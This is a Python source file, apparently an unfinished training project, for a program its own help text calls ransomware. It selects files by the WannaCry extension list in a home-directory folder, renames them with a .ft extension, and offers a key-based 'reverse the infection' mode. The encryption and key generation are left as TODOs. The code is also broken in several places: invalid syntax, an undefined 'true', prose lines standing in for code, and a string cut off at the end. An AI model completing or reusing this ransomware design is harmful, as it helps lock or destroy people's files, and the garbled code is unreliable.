import utils

class Stockholm:
	usage = "Usage: ./stockholm [options] KEY\n \
	options:\n\
		- -h, -help : display the help\n \
		- -v, -version: Display program's version\n \
		- -r, -reverse: reverse the infection using the given key\n \
		- -s, -silent: Do not display the encrypted files\n"

	wannacry = [".doc", ".docx", ".xls", ".xlsx", ".ppt", 
		".pptx", ".odt", ".ods", ".odp", ".rtf", ".txt", ".csv",
		".jpg", ".jpeg", ".png", ".bmp", ".gif", ".tif", ".raw",
		".psd", ".mp3", ".mp4", ".avi", ".mkv", ".zip", ".rar",
		".7z", ".tar", ".gz", ".bak", ".sql", ".db", ".mdb", ".cpp", ".c",
		".h", ".java", ".py", ".php", ".js", ".pdf", ".xml", ".json"]

	key = ""

	@classmethod
	def help(cls):
		print(cls.usage)
		print("Ransomware that only affects files whose extensions have been affected by WANNACRY, inside a folder named INFECTION inside HOME directory.\n")
		print(" * The key given to encrypt must be at least 16 characters long\n")
		print(" * All the affected files while are renamed  with a .ft extension\n")

	def version():
		print("v1.0.0")

	def __init__(self, args):
		self.options = ""
		self.key = ""
		self.display = true

		i = 0
		while i < len(args):
			if args[i] == "-r" or args[i] == "-reverse":
				self.options += "r"
			elif args[i] == "-h" or args[i] == "-help":
				self.options += "h"
			elif args[i] == "-v" or args[i] == "-version":
				self.options += "v"
			elif args[i] == "-s" or args[i] == "-silent":
				self.options += "s"
			elif args[i] == "-k" or args[i] == "-key":
				self.options += "k"
			else:
				if i < len(args) - 1:
					raise ValueError(f"Invalid option: {args[i]}")
				if len(args[i]) < 16:
					raise ValueError("Encryptiion key must be at least 16 characters long")
				self.key = args[i]
			i += 1

	def encrypt(self):
		file_list = utils.get_all_files()
		file_list = [file for file in file_list if os.path.splitext(file)[1] in Stockholm.wannacry]

		if not file_list:
			print("Nothing to do here ...")
			return

		print(f"Encrypted: \n") if self.display
		for file in file_list:
			# TODO
			print(f"  * {file}") if self.display
			os.rename(file, file + ".ft")

	def decrypt(self):
		file_list = utils.get_all_files()
		file_list = [file for file in file_list if os.path.splitext(file)[1] == ".ft"] 
		
		if not file_list:
			print("Nothing to do here ...")
			return

		print(f"Decrypted: \n") if self.display
		for file in file_list:
			# TODO
			print(f"  * {file[:-3]}") if self.display
			os.rename(file, file[:-3])

	def generate_keys():
		# TODO: Generate a private and a public key
		Store the private in .secret_key
		Use the public to generate the 


	def print(self):
		print(f"Options: ")
		for o in self.options:
			print(f"  - {o}")
		print(f"Key: {self.key}